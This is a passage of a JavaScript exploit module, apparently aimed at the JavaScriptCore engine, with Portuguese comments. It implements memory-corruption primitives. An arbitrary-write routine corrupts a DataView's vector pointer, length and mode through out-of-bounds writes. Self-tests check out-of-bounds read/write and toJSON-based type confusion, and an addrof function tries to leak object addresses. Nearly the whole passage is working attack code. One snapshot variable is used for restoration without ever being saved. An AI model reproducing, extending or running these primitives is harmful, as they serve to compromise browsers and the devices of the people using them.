        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) {
            throw new Error("Ambiente OOB não pôde ser inicializado para escrita arbitrária.");
        }
    }
    let addr64 = absolute_address;
    if (!isAdvancedInt64Object(addr64)) {
        try { addr64 = new AdvancedInt64(addr64); } catch (e) {
            throw new TypeError(`Endereço para arb_write deve ser AdvancedInt64 ou conversível: ${e.message}`);
        }
        if (!isAdvancedInt64Object(addr64)) {
            throw new TypeError(`Endereço convertido para arb_write não é AdvancedInt64 válido.`);
        }
    }

    let m_length_orig_snap, m_mode_orig_snap;
    try {
        // === Corrupção Temporária para L/E Arbitrária ===
        // Salvar os metadados originais do DataView base (que agora é normal)
        m_length_orig_snap = oob_dataview_real.byteLength;
        m_mode_orig_snap = oob_dataview_real.getUint32(OOB_DV_M_MODE_OFFSET, true);

        log(`[${FNAME}] DEBUG: Snapshots ORIGINAIS: m_length=${toHex(m_length_orig_snap)}, m_mode=${toHex(m_mode_orig_snap)}`, 'debug');

        // Corromper o m_vector do DataView base para apontar para o endereço alvo.
        oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, addr64, 8);

        // Corromper o m_length para 0xFFFFFFFF e m_mode para o valor OOB
        oob_write_absolute(OOB_DV_M_LENGTH_OFFSET, 0xFFFFFFFF, 4);
        oob_write_absolute(OOB_DV_M_MODE_OFFSET, JSC_OFFSETS.DataView.M_MODE_CANDIDATES[0], 4);

        log(`[${FNAME}] DEBUG: DataView CORROMPIDO: m_vector=${toHexHelper(oob_read_absolute(OOB_DV_M_VECTOR_OFFSET, 8))}, m_length=${toHex(oob_read_absolute(OOB_DV_M_LENGTH_OFFSET, 4))}, m_mode=${toHex(oob_read_absolute(OOB_DV_M_MODE_OFFSET, 4))}.`, 'debug');

        log(`[${FNAME}] DEBUG: Realizando escrita arbitrária em ${addr64.toString(true)} (valor: ${toHexHelper(value, byteLength * 8)}, byteLength: ${byteLength}).`, 'debug');
        let val64_write;
        switch (byteLength) {
            case 1: oob_dataview_real.setUint8(0, Number(value)); break;
            case 2: oob_dataview_real.setUint16(0, Number(value), true); break;
            case 4: oob_dataview_real.setUint32(0, Number(value), true); break;
            case 8:
                val64_write = isAdvancedInt64Object(value) ? value : new AdvancedInt64(value);
                if (!isAdvancedInt64Object(val64_write)) {
                    throw new TypeError("Valor para escrita de 8 bytes não é AdvancedInt64 válido após conversão.");
                }
                oob_dataview_real.setUint32(0, val64_write.low(), true);
                oob_dataview_real.setUint32(4, val64_write.high(), true);
                break;
            default: throw new Error("Invalid byteLength para arb_write");
        }
    } catch (e) {
        log(`ERRO CRÍTICO em ${FNAME} ao escrever em ${addr64.toString(true)} (valor: ${toHexHelper(value, byteLength * 8)}, byteLength: ${byteLength}): ${e.message}`, "critical", FNAME);
        isOOBEnvironmentSetup = false;
        throw e;
    } finally {
        // === Restauração dos Metadados do DataView ===
        if (isOOBReady() && oob_dataview_real) {
            log(`[${FNAME}] DEBUG: Restaurando metadados originais do DataView após escrita.`, 'debug');
            try {
                oob_write_absolute(OOB_DV_M_VECTOR_OFFSET, m_vector_orig_snap, 8); // m_vector_orig_snap deve ser um AdvancedInt64
                oob_write_absolute(OOB_DV_M_LENGTH_OFFSET, m_length_orig_snap, 4);
                oob_write_absolute(OOB_DV_M_MODE_OFFSET, m_mode_orig_snap, 4);
                await _perform_explicit_dv_reset_after_arb_op(FNAME);
                log(`[${FNAME}] DEBUG: Restauração de metadados concluída com sucesso.`, 'debug');
            } catch (eR) {
                log(`[${FNAME}] ERRO CRÍTICO restaurando/resetando metadados: ${eR.message}. Ambiente agora INSEGURo.`, 'critical');
                isOOBEnvironmentSetup = false;
            }
        } else {
            log(`[${FNAME}] ALERTA: Não foi possível restaurar metadados. Ambiente OOB já estava inválido ou foi comprometido.`, 'critical');
        }
    }
}


export function selfTestOOBReadWrite(logFnParam) {
    const currentLog = logFnParam || log;
    const FNAME_TEST = 'CoreExploit.selfTestOOBReadWrite';
    currentLog(`--- Iniciando Auto-Teste de OOB R/W (v31.20 - com re-inicialização forçada e validação de m_mode) ---`, 'test', FNAME_TEST);
    let success32 = false;
    let success64 = false;

    // Declaração de local_oob_refs fora do try para que possa ser acessada no finally
    let local_oob_refs = []; 

    try {
        currentLog(`    (Setup) Chamando triggerOOB_primitive...`, 'info', FNAME_TEST);
        triggerOOB_primitive({ force_reinit: true });

        // >>> Tentar fortalecer a alocação do oob_array_buffer_real aqui <<<
        // Mantendo múltiplas referências para evitar GC agressivo
        for (let i = 0; i < 100; i++) { // Aloca mais 100 buffers do mesmo tamanho para "segurar" a região de memória
            local_oob_refs.push(new ArrayBuffer(getOOBAllocationSize()));
        }
        // Tentativa de "pinning" usando acesso constante, embora JS não garanta.
        // Acessar o buffer base para potencialmente "piná-lo" no JIT
        try {
            for (let i = 0; i < 1000; i++) {
                // Acessar via new DataView(oob_array_buffer_real) para evitar cache do motor
                if (oob_array_buffer_real && oob_array_buffer_real.byteLength > 0) {
                    new DataView(oob_array_buffer_real).getUint8(0); 
                } else {
                    // Se o buffer já está inválido aqui, o pinning não ajudará, mas o teste já falharia.
                    break; 
                }
            }
        } catch (e) {
            // Ignorar erros aqui, o objetivo é tentar aquecer o JIT e "pin" o buffer.
            // O erro principal será capturado pelo selfTest, se realmente houver um problema.
            log(`[${FNAME_TEST}] ALERTA: Exceção durante o pinning/aquecimento: ${e.message}`, "warn");
        }
        // Fim da tentativa de fortalecimento da alocação.
        

        if (!isOOBReady()) {
            currentLog(`    (Setup) FALHA CRÍTICA: Ambiente OOB não pôde ser inicializado para auto-teste.`, "critical", FNAME_TEST);
            return false;
        }
        currentLog(`    (Setup) Ambiente OOB pronto para teste.`, "good", FNAME_TEST);

        const test_offset = 0x50;
        // O teste de offset aqui agora depende da capacidade NORMAL do DataView, que é o getOOBAllocationSize()
        // Portanto, o offset 0x50 deve estar dentro dos limites do DataView principal.
        if (test_offset + 8 > oob_array_buffer_real.byteLength) { 
             currentLog(`    (Setup) ERRO: Offset de teste (${toHex(test_offset)}) está fora dos limites do oob_array_buffer_real (${oob_array_buffer_real.byteLength}).`, "critical", FNAME_TEST);
             throw new Error("Offset de teste fora dos limites.");
        }

        // Teste de 32 bits
        const test_val32 = 0x11223344;
        currentLog(`    (32bit Test) Escrevendo ${toHex(test_val32)} em offset absoluto ${toHex(test_offset)} do oob_array_buffer_real`, "debug", FNAME_TEST);
        oob_write_absolute(test_offset, test_val32, 4); // Esta escrita AGORA é in-bounds.
        const read_val32 = oob_read_absolute(test_offset, 4); // Esta leitura AGORA é in-bounds.
        currentLog(`    (32bit Test) Lido ${toHex(read_val32)} de offset absoluto ${toHex(test_offset)}`, "debug", FNAME_TEST);

        if (read_val32 === test_val32) {
            currentLog(`    (32bit Test) SUCESSO: Lido ${toHex(read_val32)} corretamente.`, "good", FNAME_TEST);
            success32 = true;
        } else {
            currentLog(`    (32bit Test) FALHA: Lido ${toHex(read_val32)}, esperado ${toHex(test_val32)}.`, "error", FNAME_TEST);
        }

        // Teste de 64 bits
        const next_offset = test_offset + 16;
        if (next_offset + 8 > oob_array_buffer_real.byteLength) {
            currentLog(`    (64bit Test) ERRO: Offset ${toHex(next_offset)} fora dos limites do buffer (${oob_array_buffer_real.byteLength})`, "critical", FNAME_TEST);
            throw new Error("Offset para teste 64bit fora dos limites");
        }
        const test_val64 = new AdvancedInt64(0xAABBCCDD, 0xEEFF0011);
        currentLog(`    (64bit Test) Escrevendo (test_val64): ${toHexHelper(test_val64)} em offset absoluto ${toHex(next_offset)}`, "debug", FNAME_TEST);
        oob_write_absolute(next_offset, test_val64, 8); // Esta escrita AGORA é in-bounds.

        const read_val64 = oob_read_absolute(next_offset, 8); // Esta leitura AGORA é in-bounds.
        currentLog(`    (64bit Test) Lido de offset absoluto ${toHex(next_offset)}. Tipo retornado: object.`, "debug", FNAME_TEST);

        if (isAdvancedInt64Object(read_val64)) {
            currentLog(`    (64bit Test) Verificação local de tipo: OK. Valor lido (read_val64): ${toHexHelper(read_val64)}`, "debug", FNAME_TEST);
            if (read_val64.low() === test_val64.low() && read_val64.high() === test_val64.high()) {
                currentLog(`    (64bit Test) SUCESSO: Lido ${toHexHelper(read_val64)} (low/high) corretamente.`, "good", FNAME_TEST);
                success64 = true;
            } else {
                currentLog(`    (64bit Test) FALHA: Componentes low/high não correspondem. Lido ${toHexHelper(read_val64)}, Esperado ${toHexHelper(test_val64)}.`, "error", FNAME_TEST);
                currentLog(`        Lido  : low=0x${read_val64.low().toString(16)}, high=0x${read_val64.high().toString(16)}`, "error", FNAME_TEST);
                currentLog(`        Esperado: low=0x${test_val64.low().toString(16)}, high=0x${test_val64.high().toString(16)}`, "error", FNAME_TEST);
            }
        } else {
            currentLog(`    (64bit Test) FALHA: Valor lido NÃO é reconhecido como um objeto AdvancedInt64 pela verificação local. Construtor: ${read_val64?.constructor?.name}. Valor: ${String(read_val64)} Esperado: ${toHexHelper(test_val64)}.`, "error", FNAME_TEST);
        }

        currentLog(`--- Auto-Teste de OOB R/W Concluído (32bit: ${success32}, 64bit: ${success64}) ---`, "test", FNAME_TEST);
        return success32 && success64;
    } catch (e) {
        currentLog(`ERRO no Auto-Teste OOB R/W: ${e.message}`, "critical", FNAME_TEST);
        console.error(`[${FNAME_TEST}] Exception: `, e);
        isOOBEnvironmentSetup = false;
        return false;
    } finally {
        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        // Limpar referências adicionais de pinning para permitir o GC
        local_oob_refs = []; 
        currentLog(`    (Cleanup) Ambiente OOB limpo após self-test.`, 'info', FNAME_TEST);
    }
}

// Corrigido: Usar a constante principal para metadados base OOB
const HEISENBUG_OOB_DATAVIEW_METADATA_BASE_core = OOB_DV_METADATA_BASE_IN_OOB_BUFFER;
const HEISENBUG_OOB_DATAVIEW_MLENGTH_OFFSET_core = JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
const HEISENBUG_CRITICAL_WRITE_OFFSET_core = HEISENBUG_OOB_DATAVIEW_METADATA_BASE_core + HEISENBUG_OOB_DATAVIEW_MLENGTH_OFFSET_core;
const HEISENBUG_CRITICAL_WRITE_VALUE_core = 0xFFFFFFFF;
const HEISENBUG_VICTIM_AB_SIZE_core = 64;

export function selfTestTypeConfusionAndMemoryControl(logFnParam) {
    const currentLog = logFnParam || log;
    const FNAME_TEST = 'CoreExploit.selfTestTypeConfusionAndMemoryControl';
    currentLog(`--- Iniciando Auto-Teste Combinado (v31.19): Type Confusion e Controle de Memória ---`, 'test', FNAME_TEST);

    let originalToJSONDescriptor = null;
    let pollutionApplied = false;
    let local_probe_details_for_selftest = null;
    let overallSuccess = false;
    let tcPhaseSuccess = false;

    try {
        currentLog(`FASE 1: Testando Type Confusion (usando constantes HEISENBUG_*)...`, "subtest", FNAME_TEST);
        triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) {
            throw new Error("Falha ao inicializar ambiente OOB para teste de Type Confusion.");
        }
        oob_write_absolute(HEISENBUG_CRITICAL_WRITE_OFFSET_core, HEISENBUG_CRITICAL_WRITE_VALUE_core, 4);
        currentLog(`        (TC SelfTest) Escrita OOB crítica realizada.`, "info", FNAME_TEST);
        PAUSE(100);

        let victim_ab_for_selftest = new ArrayBuffer(HEISENBUG_VICTIM_AB_SIZE_core);
        currentLog(`    (TC SelfTest) victim_ab_for_selftest (tamanho ${HEISENBUG_VICTIM_AB_SIZE_core} bytes) criado.`, "info", FNAME_TEST);

        const toJSON_ProbeForSelfTest = function () {
            local_probe_details_for_selftest = {
                this_type_in_toJSON: Object.prototype.toString.call(this),
                is_victim_direct_ref: (this === victim_ab_for_selftest)
            };
            return { self_test_probe_executed_tc: true, observed_this_type: local_probe_details_for_selftest.this_type_in_toJSON };
        };

        const ppKey_TC = 'toJSON';
        originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey_TC);
        Object.defineProperty(Object.prototype, ppKey_TC, {
            value: toJSON_ProbeForSelfTest,
            writable: true, configurable: true, enumerable: false
        });
        pollutionApplied = true;
        currentLog(`            (TC SelfTest) Object.prototype.${ppKey_TC} poluído com sonda.`, "info", FNAME_TEST);

        let stringifyOutput_TC = JSON.stringify(victim_ab_for_selftest);
        currentLog(`            (TC SelfTest) JSON.stringify completou. Retorno da sonda: "${stringifyOutput_TC}"`, "info", FNAME_TEST);
        currentLog(`            (TC SelfTest) Detalhes da sonda: ${local_probe_details_for_selftest ? JSON.stringify(local_probe_details_for_selftest) : 'N/A'}`, "leak", FNAME_TEST);

        if (local_probe_details_for_selftest && local_probe_details_for_selftest.this_type_in_toJSON === "[object Object]") {
            currentLog(`    (TC SelfTest) SUCESSO (ou SUCESSO PARCIAL): Confusão de tipo detectada! 'this' é [object Object]. (is_victim_direct_ref: ${local_probe_details_for_selftest.is_victim_direct_ref})`, "vuln", FNAME_TEST);
            tcPhaseSuccess = true;
        } else {
            let detailsMsg = local_probe_details_for_selftest ? `is_victim_direct_ref=${local_probe_details_for_selftest.is_victim_direct_ref}, type=${local_probe_details_for_selftest.this_type_in_toJSON}` : "sonda não forneceu detalhes";
            currentLog(`    (TC SelfTest) FALHA: Teste de Type Confusion. Detalhes: ${detailsMsg}. Esperado tipo [object Object].`, "error", FNAME_TEST);
        }
    } catch (e) {
        currentLog(`ERRO na FASE 1 (Type Confusion - SelfTest): ${e.message}${e.stack ? '\n' + e.stack : ''}`, 'critical', FNAME_TEST);
    } finally {
        if (pollutionApplied) {
            if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey_TC, originalToJSONDescriptor);
            else delete Object.prototype[ppKey_TC];
            currentLog(`            (TC SelfTest) Object.prototype.toJSON restaurado.`, "info", FNAME_TEST);
            pollutionApplied = false;
            originalToJSONDescriptor = null;
        }
        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
    }

    if (!tcPhaseSuccess) {
        currentLog(`Teste de Type Confusion (SelfTest) falhou. Abortando teste de Controle de Memória.`, 'warn', FNAME_TEST);
    } else {
        PAUSE(200);
        currentLog(`FASE 2: Testando Controle de Memória...`, 'subtest', FNAME_TEST);
        let memoryControlPhaseSuccess = false;
        try {
            if (!isOOBReady()) {
                currentLog(`    (MC) Ambiente OOB não estava pronto. Reconfigurando...`, 'warn', FNAME_TEST);
                triggerOOB_primitive({ force_reinit: true });
                if (!isOOBReady()) throw new Error("Falha ao (re)inicializar ambiente OOB para teste de Controle de Memória.");
            }
            const OFFSET_M_LENGTH_TARGET = OOB_DV_M_LENGTH_OFFSET;
            const OFFSET_M_MODE_TARGET = OOB_DV_M_MODE_OFFSET;

            const PLANT_M_LENGTH = 0xBABEFACE;
            const PLANT_M_MODE = 0x00000001;

            currentLog(`    (MC) Configurando m_length e m_mode...`, 'info', FNAME_TEST);
            oob_write_absolute(OFFSET_M_LENGTH_TARGET, PLANT_M_LENGTH, 4);
            oob_write_absolute(OFFSET_M_MODE_TARGET, PLANT_M_MODE, 4);
            currentLog(`        m_length (@${toHex(OFFSET_M_LENGTH_TARGET)}) para ${toHex(PLANT_M_LENGTH)}`, 'info', FNAME_TEST);
            currentLog(`        m_mode (@${toHex(OFFSET_M_MODE_TARGET)}) para ${toHex(PLANT_M_MODE)}`, 'info', FNAME_TEST);

            currentLog(`    (MC) Verificando valores plantados:`, 'info', FNAME_TEST);
            const read_m_length_val = oob_read_absolute(OFFSET_M_LENGTH_TARGET, 4);
            const read_m_mode_val = oob_read_absolute(OFFSET_M_MODE_TARGET, 4);

            currentLog(`        Lido m_length (@${toHex(OFFSET_M_LENGTH_TARGET)}): ${toHex(read_m_length_val)}`, "leak", FNAME_TEST);
            currentLog(`        Lido m_mode    (@${toHex(OFFSET_M_MODE_TARGET)}): ${toHex(read_m_mode_val)}`, "leak", FNAME_TEST);

            if (read_m_length_val === PLANT_M_LENGTH && read_m_mode_val === PLANT_M_MODE) {
                currentLog(`    (MC) SUCESSO: Controle de m_length e m_mode verificado!`, "vuln", FNAME_TEST);
                memoryControlPhaseSuccess = true;
            } else {
                if (read_m_length_val !== PLANT_M_LENGTH) {
                    currentLog(`    (MC) FALHA: m_length lido (${toHex(read_m_length_val)}) não corresponde ao plantado (${toHex(PLANT_M_LENGTH)}).`, "error", FNAME_TEST);
                }
                if (read_m_mode_val !== PLANT_M_MODE) {
                    currentLog(`    (MC) FALHA: m_mode lido (${toHex(read_m_mode_val)}) não corresponde ao plantado (${toHex(PLANT_M_MODE)}).`, "error", FNAME_TEST);
                }
            }
        } catch (e) {
            currentLog(`ERRO na FASE 2 (Controle de Memória - SelfTest): ${e.message}${e.stack ? '\n' + e.stack : ''}`, 'critical', FNAME_TEST);
        } finally {
            clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        }
        if (tcPhaseSuccess && memoryControlPhaseSuccess) {
            overallSuccess = true;
        }
    }

    currentLog(`--- Auto-Teste Combinado CONCLUÍDO ${overallSuccess ? 'COM SUCESSO' : 'COM FALHA'} ---`, 'test', FNAME_TEST);
    return overallSuccess;
}

let _targetObjectForAddrofProbe_core_internal_v31_7 = null;
let _heisenbugConfirmedByProbe_core_internal_v31_7 = false;

function _toJSONProbeForAddrofInCoreInternal_v31_7() {
    let currentThisType = Object.prototype.toString.call(this);
    if (currentThisType === '[object Object]') {
        _heisenbugConfirmedByProbe_core_internal_v31_7 = true;
        if (_targetObjectForAddrofProbe_core_internal_v31_7) {
            try { this[0] = _targetObjectForAddrofProbe_core_internal_v31_7; } catch (e_write) {
                log(`[CoreAddrofProbeInternal_v31_7] Erro ao tentar this[0] = target: ${e.message}`, 'warn');
            }
        }
    } else { _heisenbugConfirmedByProbe_core_internal_v31_7 = false; }
    return { core_addrof_probe_executed: true, type_seen: currentThisType };
}

export async function attemptAddrofUsingCoreHeisenbug(targetObject) {
    const FNAME_FUNC = "CoreExploit.attemptAddrofUsingCoreHeisenbug";
    log(`[${FNAME_FUNC}] AVISO: Primitiva addrof (Heisenbug) é conhecida por falhar no ambiente atual. Tentando (v31.19)...`, "warn", FNAME_FUNC);
    _targetObjectForAddrofProbe_core_internal_v31_7 = targetObject;
    _heisenbugConfirmedByProbe_core_internal_v31_7 = false;
    let addrof_result_internal = { success: false, message: "Addrof (Heisenbug) não iniciado.", leaked_address_as_double: NaN, leaked_address_as_int64: null };
    let originalToJSONDescriptorForCoreAddrof = Object.getOwnPropertyDescriptor(Object.prototype, 'toJSON');
    let pollutedByCoreAddrof = false;
    try {
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) {
            throw new Error("Ambiente OOB não pôde ser inicializado para Addrof.");
        }
        oob_write_absolute(HEISENBUG_CRITICAL_WRITE_OFFSET_core, HEISENBUG_CRITICAL_WRITE_VALUE_core, 4);
        await PAUSE(100);
        let confused_ab_candidate = new ArrayBuffer(HEISENBUG_VICTIM_AB_SIZE_core);
        let float_view_on_confused_ab = new Float64Array(confused_ab_candidate);
        const fillPatternForAddrof = 0.445566778812345;
        float_view_on_confused_ab.fill(fillPatternForAddrof);

        Object.defineProperty(Object.prototype, 'toJSON', { value: _toJSONProbeForAddrofInCoreInternal_v31_7, writable: true, configurable: true, enumerable: false });
        pollutedByCoreAddrof = true;
        JSON.stringify(confused_ab_candidate);

        if (_heisenbugConfirmedByProbe_core_internal_v31_7) {
            const val_double = float_view_on_confused_ab[0];
            addrof_result_internal.leaked_address_as_double = val_double;
            log(`[${FNAME_FUNC}] Heisenbug confirmada. Valor lido como double: ${val_double} (Hex: ${toHex(new Float64Array([val_double]).buffer, 64)})`, 'leak');

            if (val_double === fillPatternForAddrof) {
                addrof_result_internal.message = "Heisenbug ocorreu, mas valor no buffer não foi alterado (ainda é o fillPattern). Addrof falhou.";
            } else {
                const db_conv_buf = new ArrayBuffer(8);
                new Float64Array(db_conv_buf)[0] = val_double;
                const dv_conv_i = new Uint32Array(db_conv_buf);
                const potential_addr = new AdvancedInt64(dv_conv_i[0], dv_conv_i[1]);
                addrof_result_internal.leaked_address_as_int64 = potential_addr.toString(true);
                log(`[${FNAME_FUNC}] Convertido para Int64: ${toHexHelper(potential_addr)}`, 'leak');

                if (!(potential_addr.equals(AdvancedInt64.Zero)) &&
                    !(potential_addr.equals(AdvancedInt64.NaNValue)) &&
                    val_double !== 0
                ) {
                    addrof_result_internal.success = true;
                    addrof_result_internal.message = "Addrof (Heisenbug) supostamente bem-sucedido. Verifique o valor.";
                } else {
                    log(`[${FNAME_FUNC}] AVISO: AdvancedInt64.NaNValue é 0x${AdvancedInt64.NaNValue.high().toString(16)}_${AdvancedInt64.NaNValue.low().toString(16)}`, "debug");
                    addrof_result_internal.message = `Heisenbug ocorreu, mas valor lido (${toHexHelper(potential_addr)}) não parece endereço válido.`;
                }
            }
        } else {
            addrof_result_internal.message = "Heisenbug não foi confirmada pela sonda.";
        }
    } catch (e) {
        addrof_result_internal.message = `Erro crítico em Addrof: ${e.message}`;
        log(`[${FNAME_FUNC}] Exception: ${e.message}`, 'critical');
    } finally {
        if (pollutedByCoreAddrof) {
            if (originalToJSONDescriptorForCoreAddrof) Object.defineProperty(Object.prototype, 'toJSON', originalToJSONDescriptorForCoreAddrof);
            else delete Object.prototype.toJSON;
        }
        _targetObjectForAddrofProbe_core_internal_v31_7 = null;
        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
    }
    log(`[${FNAME_FUNC}] Resultado: ${JSON.stringify(addrof_result_internal)}`, addrof_result_internal.success ? 'good' : 'warn');
    return addrof_result_internal;
}

export function getOOBDataView() {
    return oob_dataview_real;
}
